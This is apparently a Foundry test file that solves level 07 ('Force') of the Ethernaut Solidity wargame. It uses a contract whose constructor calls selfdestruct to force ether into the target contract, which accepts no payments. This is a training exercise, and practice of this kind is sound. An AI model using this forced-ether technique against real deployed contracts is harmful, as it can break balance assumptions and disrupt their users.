// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Force} from "../../src/07/Force.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ForceFactory} from "src/07/ForceFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract ForceTest is Test, BaseTest {
    Force public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new ForceFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Force(instance);
    }

    function testBalanceInstanceContractis0() public view {
        assert(address(instanceContract).balance == 0);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        new Exploit{value: 1 ether}(payable(address(instanceContract)));
        // @note always check the inviarant address(this).balance == 0

        vm.stopPrank();

        assert(address(instanceContract).balance > 0);
    }
}

contract Exploit {
    constructor(address payable _instance) payable {
        selfdestruct(_instance);
    }
}
